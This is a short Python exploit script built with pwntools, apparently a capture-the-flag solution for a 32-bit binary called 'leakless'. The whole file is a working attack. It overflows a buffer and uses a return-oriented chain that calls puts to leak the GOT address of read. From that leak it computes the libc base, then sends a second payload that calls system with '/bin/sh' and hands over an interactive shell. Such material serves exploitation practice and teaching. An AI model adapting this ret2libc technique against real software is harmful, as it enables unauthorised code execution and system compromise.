from pwn import *

e = ELF('./leakless')
#libc = ELF('./libc6_2.26-0ubuntu2.1_i386.so')
libc = ELF('/lib32/libc.so.6')
p = process('./leakless')

puts_addr = e.plt['puts']
pop_ebx_addr = 0x080483ad

payload = 'A' * 76
payload += p32(puts_addr)
payload += p32(pop_ebx_addr)
payload += p32(e.got['read'])
payload += p32(e.symbols['_start'])

p.send(payload)

read_addr = u32(p.recvline()[:4])
libc_base_addr = read_addr - libc.symbols['read']
system_addr = libc.symbols['system'] + libc_base_addr
binsh_addr = next(libc.search("/bin/sh")) + libc_base_addr

payload = 'A'*76
payload += p32(system_addr)
payload += 'AAAA' #p32(pop_ebx_addr)
payload += p32(binsh_addr)

p.send(payload)
p.interactive()